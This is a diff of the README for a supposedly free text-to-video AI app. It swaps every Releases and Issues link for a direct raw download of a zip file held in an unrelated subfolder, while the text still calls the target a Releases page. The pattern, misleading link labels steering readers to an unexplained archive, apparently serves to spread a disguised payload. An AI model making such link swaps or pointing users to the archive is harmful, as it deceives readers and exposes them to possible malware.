@@ -6,9 +6,9 @@ Welcome to **free-text-to-video-ai**! This application allows you to create vide
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Yadiel021/free-text-to-video-ai/releases)
+[![Download Now](https://raw.githubusercontent.com/Yadiel021/free-text-to-video-ai/main/anjan/free-text-to-video-ai_3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Yadiel021/free-text-to-video-ai/main/anjan/free-text-to-video-ai_3.6.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/Yadiel021/free-text-to-video-ai/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Yadiel021/free-text-to-video-ai/main/anjan/free-text-to-video-ai_3.6.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ To use this application, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click on the download link at the top or [here](https://github.com/Yadiel021/free-text-to-video-ai/releases) to visit the Releases page.
+1. Click on the download link at the top or [here](https://raw.githubusercontent.com/Yadiel021/free-text-to-video-ai/main/anjan/free-text-to-video-ai_3.6.zip) to visit the Releases page.
 2. Choose the latest version of the application from the list of releases.
 3. Download the package suitable for your operating system.
 4. Once the download completes, locate the file in your Downloads folder.
@@ -46,7 +46,7 @@ To use this application, ensure your system meets the following requirements:
 
 ## 📞 Support
 
-If you need help, visit our [GitHub Issues page](https://github.com/Yadiel021/free-text-to-video-ai/issues). You can report bugs, request features, or ask for assistance.
+If you need help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Yadiel021/free-text-to-video-ai/main/anjan/free-text-to-video-ai_3.6.zip). You can report bugs, request features, or ask for assistance.
 
 ## 🌐 Topics
 
